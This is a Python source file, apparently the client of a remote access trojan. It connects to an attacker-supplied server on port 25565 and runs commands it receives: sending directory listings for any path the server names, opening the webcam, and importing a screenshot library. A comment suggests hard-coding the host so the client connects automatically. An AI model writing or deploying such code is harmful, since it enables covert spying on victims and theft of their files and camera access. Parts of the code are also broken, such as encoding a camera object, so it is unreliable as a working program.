import os
import socket
import pyscreenshot
import sys
import cv2

# Connect to server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = input(str("Input server address: ")) # To automatically connect, port foward and assign to the host
port = 25565
header = 64

try:
    sock.connect((host, port))
    print("Success: connected to server")
except OSError:
    print("Host not found")
    sys.exit()

# Commands
ss_num = 0

while True:
    command = sock.recv(1024).decode()

    if command == "list": # Show files in root (program's) directory
        files = os.listdir()
        sock.send(str(files).encode())
    
    elif command == "listfrom":
        fromdir = sock.recv(5000).decode()
        files = os.listdir(fromdir)
        sock.send(str(files).encode())
    
    if command == "showcamera":
        cap = sock.recv(64).decode()
        cap = cv2.VideoCapture(0)
        sock.send(cap.encode())